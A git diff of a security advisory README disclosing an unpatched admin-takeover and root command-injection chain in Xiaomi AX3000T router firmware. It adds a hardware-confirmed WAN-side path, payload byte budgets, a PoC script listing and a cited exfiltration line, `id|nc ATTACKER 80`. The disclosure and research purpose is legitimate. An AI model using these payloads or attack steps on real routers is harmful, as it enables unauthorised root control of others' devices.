@@ -1,4 +1,4 @@
-# Xiaomi AX3000T (RD03v2) — `cab_meshd` admin takeover and conditional root RCE
+# Xiaomi AX3000T (RD03v2) — `cab_meshd` admin takeover and pre-auth root RCE
 
 An adjacent client that can reach an initialized CAP's `cab_meshd` can obtain
 **web-admin access without the admin password** (V1). On RD03v2 stock 2.0.28,
@@ -6,18 +6,27 @@ we also demonstrated a V1 → V2 chain to an interactive root shell after minima
 initialization left `NETMODE` unset. Normal Xiaomi web setup can instead set
 `NETMODE=whc_cap`, which blocks the demonstrated `cap_init` root path. The root
 callback and interactive shell were confirmed on physical hardware in the
-gate-open state; reachability after ordinary web setup has not been shown.
+gate-open state; reachability after ordinary web setup has not been shown. A
+second path is now confirmed on factory-reset hardware: an attacker on the WAN-side
+L2 segment can impersonate a CAP and drive the uninitialized RE client directly to
+root command execution, without V1, an admin session, or `init_router.py`.
 
 > **Scope clarification, 2026-09-28:** Read [`CORRECTIONS.md`](CORRECTIONS.md)
 > for the setup-state evidence and corrections to the original publication.
+>
+> **Hardware update, 2026-10-01:** The RE/WAN path was reproduced end-to-end on
+> physical RD03v2 hardware. Read [`evidence/hardware-validation.md`](evidence/hardware-validation.md)
+> and [`chain2-root-rce.md`](chain2-root-rce.md) for the corrected wire layout,
+> argument-position requirements, and one-shot behavior.
 
 > ### Published 2026-09-28
 >
 > This is the public release of a coordinated-disclosure package, first reported to
 > Xiaomi on **2026-08-14** on a stated 45-day timeline. Nothing is patched.
 >
-> **It ships a working proof-of-concept for the gate-open state** — the
-> over-the-air root chain — because for the analysed model, the **Xiaomi AX3000T
+> **It ships working proof-of-concept code for both hardware-confirmed root
+> paths** — the initialized, gate-open OTA chain and the factory RE/WAN chain —
+> because for the analysed model, the **Xiaomi AX3000T
 > (`RD03v2`)**, escaping to OpenWrt is the only path off the vulnerable firmware, and
 > the exploit is what makes that install possible without opening the case. That
 > installer is **`RD03v2`-only**; it does not serve the other 28 verified model codes.
@@ -35,7 +44,7 @@ gate-open state; reachability after ordinary web setup has not been shown.
 | Device | Xiaomi Router AX3000T (`xiaomi.router.rd03v2`, hardware `RD03v2`) |
 | Firmware | MiWiFi / XiaoQiang `romversion 2.0.28` (analysed and tested) |
 | Component | `/usr/sbin/cab_meshd` (mesh commissioning daemon) |
-| Service | TCP/UDP **19553**, on the LAN / Wi-Fi when the device runs as a mesh CAP (`INITTED=YES`) |
+| Service | TCP/UDP **19553** on LAN / Wi-Fi in CAP mode; outbound discovery and TLS on the selected WAN port in factory RE mode |
 
 V1's hard-coded key is **firmware-global and line-wide** — not per-device and not
 specific to this model. It is byte-identical in **28 Xiaomi and Redmi
@@ -87,7 +96,7 @@ The enabling design flaws:
 
 ---
 
-## Primary finding #2 — root RCE in a gate-open state (confirmed on hardware)
+## Primary finding #2 — unauthenticated root RCE (confirmed on hardware)
 
 The same `eval` sink that V1's handshake reaches also accepts attacker-controlled
 Wi-Fi configuration values planted via the admin API. V1 → V2 chains into a
@@ -96,6 +105,12 @@ Wi-Fi configuration values planted via the admin API. V1 → V2 chains into a
 `init_router.py` setup left `NETMODE` unset**. The normal Xiaomi setup path can
 set `whc_cap`, which gates this sink; a non-reset bypass from that state has not
 been demonstrated.
+
+Separately, a factory-reset RD03v2 starts `cab_meshd -C` after runtime port
+assignment gives the DHCP WAN a nonempty interface name. A rogue CAP on that WAN
+L2 segment can answer discovery, authenticate with the firmware-global `x` key,
+and deliver a type-6 `re_init` payload that reaches the same root `eval`. This
+direct path needs no V1, web login, admin API call, or prior initialization.
 
 ### OTA combined chain (the headline result)
 
@@ -120,18 +135,20 @@ been demonstrated.
   BusyBox ash root shell, full `netstat -tlnp`, device model `RD03v2`.
 - **CWE-78.** → [`chain2-root-rce.md`](chain2-root-rce.md)
 
-### Direct injection variants (emulation-confirmed)
+### Direct injection variants
 
-The `eval` sink is also reachable through two direct (non-admin) injection paths,
-both confirmed in emulation on the stock binary and scripts:
+The `eval` sink is also reachable through two direct non-admin injection paths:
 
 - **CAP/LAN variant** (initialized, gate-open router): a **~4-character** command
   via the type-4 plant. A completed `cap_init` can set `NETMODE=whc_cap` and
   close this path; normal setup can set the same mode.
-- **RE/WAN variant** (uninitialized RE instance in emulation): **ungated and repeatable** with a
-  **~36-byte** payload budget — enough for a `wget|sh` stager. Each link confirmed
-  in emulation. The shipped WAN interface name is empty, so startup and the
-  complete chain on a factory unit remain unverified.
+- **RE/WAN variant** (factory-reset router): **confirmed end-to-end on physical
+  hardware**. The router obtained a WAN DHCP lease, broadcast discovery, accepted
+  the predicted `x38d…` CAP authenticator, and executed
+  `` `id|nc ATTACKER 80` `` as `uid=0(root)`. A completed `re_init` sets
+  `INITTED=YES` and stops the RE daemon, so the path is effectively one-shot per
+  factory reset. The reliable non-overlapping field budgets are 32 bytes for
+  `bh_ssid` and 64 bytes for `bh_pswd`; the encoder itself permits 36/66 bytes.
 
 The OTA combined chain permits a full payload in the tested gate-open CAP state.
 
@@ -180,8 +197,9 @@ poc/
   handshake.py               mesh protocol driver (auth to ST_RUNNING; dumps sync config)
   extract_admin.py           PRIMARY PoC — leak verifier -> mint admin session
   ota_rce.py                 PRIMARY PoC — full OTA root RCE (V1+V2 combined), confirmed on hardware
+  re_wan_rce.py              direct factory RE/WAN root RCE, confirmed on hardware
   rce_poc.py                 research PoC for the direct injection sink (CAP/LAN path)
-  exploit.py                 injection-sink variant, documented primitive
+  exploit.py                 historical non-working CAP driver retained for analysis
 ```
 
 ## Disclosure
@@ -193,6 +211,7 @@ poc/
 | 2026-08-17 | Xiaomi Security Center acknowledged (**day 3**). Full technical package sent, encrypted to the MiSRC PGP key |
 | 2026-09-11 | **Day 28** — no substantive technical response in the 25 days since acknowledgement. Report filed with CERT/CC via VINCE: **`VRF#26-09-SFWHW`** |
 | **2026-09-28** | **Day 45 — publication.** Technical advisory *and* weaponised proof-of-concept, together |
+| **2026-10-01** | Factory RE/WAN path reproduced end-to-end on RD03v2 hardware; direct `uid=0(root)` callback without V1 or initialization |
 
 The initial notification said weaponised PoC code would be withheld for a further
 **30 days after a fix**. That plan was **changed on 2026-09-11**, and the change is
